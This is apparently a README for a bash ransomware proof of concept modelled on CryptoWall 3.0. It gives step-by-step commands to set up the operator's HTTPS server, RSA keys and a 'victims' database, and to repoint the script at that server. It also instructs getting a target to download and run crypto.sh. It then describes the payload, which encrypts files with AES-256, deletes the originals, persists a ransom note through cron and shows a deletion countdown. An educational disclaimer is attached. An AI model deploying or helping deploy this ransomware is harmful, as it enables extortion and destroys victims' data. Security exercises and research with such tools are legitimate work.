# Bash Ransomware

## Synopsis
 Simple Bash POC cryptoware that is modeled after CryptoWall 3.0

## Requirements
 - openssl
 - jquery
 - mysql
 - php 5 (php5-mysql)
 - apache2 

## What to do on the server-side
 - > Configure your comms over HTTPS
 - > Sample certs are in the sample_apache_conf directory
 - $ openssl genrsa -des3 -passout pass:neveruseinsecurepasswords -out server.pass.key 4096
 - $ openssl rsa -passin pass:neveruseinsecurepasswords -in server.pass.key -out server.key 
 - $ openssl req -new -key server.key -out server.csr
 - $ openssl x509 -req -days 4096 -in server.csr  -signkey server.key -out server.crt
 - $ chmod 600 server.*
 - $ mkdir /etc/ssl/certs/
 - $ mv server.key /etc/ssl/certs/
 - $ mv server.crt /etc/ssl/certs/
 - > Use the sample apache SSL and Default configurations in sample_apache_conf as a guide
 - > Then configure your apache to redirect HTTP traffic to HTTPS
 - > Enable SSL
 - $ a2enmod ssl
 - $ servive apache2 restart

 - > Start Crypto Setup
 - $ openssl genrsa -out priv.pem 4096
 - $ openssl rsa -pubout -in priv.pem -out pub.pem
 - $ mkdir -p /var/www/html/downloads
 - $ cp pub.pem /var/www/html/downloads/
 - > Modify crypto.sh and replace the IP with your web server's IP/URL
 - $ sed -i 's/192\.168\.1\.132/YYY\.YYY\.YYY\.YYY/g' crypto.sh # Where YYY.YYY.YYY.YYY is your IP
     OR
 - $ sed -i 's/192\.168\.1\.132/www\.yourdomain\.com/g' crypto.sh
 - $ cp crypto.sh /var/www/html/downloads/
 - > Copy all of the ransomware files to /var/www/html
 - > You should have all of the php files in the root of your web dir (/var/www/html/)
 - > You should also have /var/www/html/images/ and /var/www/html/scripts/
 - $ cd /var/www/html/
 - > Modify admin.php, admin_query.php, decrypt.php, query.php, and target.php with your database information
 - > Next, create the database for storing the data
 - $ mysql -u [user] -p
 - $ create database victims;
 - $ use victims;
 - $ create table target_list (id int(6) unsigned auto_increment primary key, unique_id varchar(16) not null, target_ip varchar(30), curr_time timestamp not null, exp_time timestamp not null, time_expired bool not null);
 - $ exit

## What to do on the client-side
 - Get target to download the file and execute or if you have have access to the system, download it directly
 - $ chmod 755 crypto.sh
 - $ ./crypto.sh &

## What it does
 - Downloads the public key from our server 
 - Generates a key file on the target
 - Loops through the system for files with the defined extensions and Uses AES-256 to encrypt the files on the system using the generated key
 - Deletes the original file, leaving only the encrypted file
 - The key file is then encrypted using the public key (RSA-4096)
 - Prints a ransom message and then persists that message through cron
 - In each dir, an INSTRUCTIONS.txt file is created and contains the ransome message
 - Links to a web page where the user can see an active countdown of the time that is left before key deletion

## TODO
 - Create unique private/public key-pair per victim
 - Move DB settings into a common.php file and refer to that file in each of the scripts (One place to edit instead of numerous places)
 - Add in error handling for non-existing files
 - Add Screenshots

## Acknowledgements/Contributors
  - Special thanks to zmallen and his lollocker (https://github.com/zmallen/lollocker)
  - lollocker served as the inspiration for this project
  - CryptoWall message text used came from https://www.pcrisk.com/removal-guides/7844-cryptowall-virus

## WARNING 
  - Use this tool at your own risk. Author is not responsible or liable if you damage your own system or others. Follow all local, state, federal, and international laws as it pertains to your geographic location. Do NOT use this tool maliciously as it is being released for educational purposes. This tools intended use is in cyber exercises or demonstrations of adversarial tools.

## Screenshots

   - Infected: <br />
   ![Infected](/screenshots/infected.jpg?raw=true "Infected") <br />
   - Decrypt: <br />
   ![Decrypt](/screenshots/decrypt_page.jpg?raw=true "Decrypt") <br />
   - Countdown: <br />
   ![Countdown](/screenshots/time_countdown.jpg?raw=true "Countdown") <br />
   - Admin: <br />
   ![Admin](/screenshots/admin_portal.jpg?raw=true "Admin") <br />
